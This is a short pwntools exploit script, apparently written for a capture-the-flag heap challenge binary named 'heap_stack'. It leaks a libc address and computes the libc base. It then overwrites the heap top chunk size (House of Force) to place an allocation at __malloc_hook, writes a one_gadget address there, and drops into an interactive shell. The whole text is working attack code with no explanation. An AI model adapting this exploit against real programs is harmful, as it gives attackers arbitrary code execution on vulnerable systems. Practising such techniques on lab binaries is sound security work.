from pwn import *
#context.log_level='debug'
def uu64(data):
	num = u64(data.ljust(8, b'\x00'))
	log.success("%#x" %(num))
	return num
def add(size,text):
	io.sendlineafter(">",str(1))
	io.sendlineafter("?",str(size))
	io.sendafter("?",text)
def add2(size,text):
	io.sendlineafter(">",str(2))
	io.sendlineafter("?",str(size))
	io.sendafter("?",text)
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
io=process('./heap_stack')
add(0x1018,p64(0x20)+p64(0xfe1)+p64(0x20)+p64(0x0fe1))

add(0xfff,'bbb')

add(0xfb0,p8(0x78))
io.sendlineafter(">",str(4))
io.recv()
libc_addr=uu64(io.recv(6))
a= [0x45226,0x4527a,0xf0364,0xf1207]
libc_base=libc_addr-0x68-libc.sym['__malloc_hook']
print hex(libc_base + libc.sym['__malloc_hook'])
malloc_hook=libc_base+libc.sym['__malloc_hook']
one_gadget=libc_base+a[3]
print("libc_base="+hex(libc_base))
#add(0xfe0-0x90-0x10,'a')
add(0x1000,'a'*0x10+p64(0x20)+p64(0xFFFFFFFFFFFFFfe1))

io.recvuntil("Malloc at  ")
heap_addr=int(io.recv(14),16)
info(hex(heap_addr))
offset=malloc_hook-(heap_addr+0x30)
gdb.attach(io)
add2(offset,'a')
add(0x20,p64(one_gadget))
# io.recvuntil('>',str(3))
# add(0x30,'a')
pause()
io.interactive()
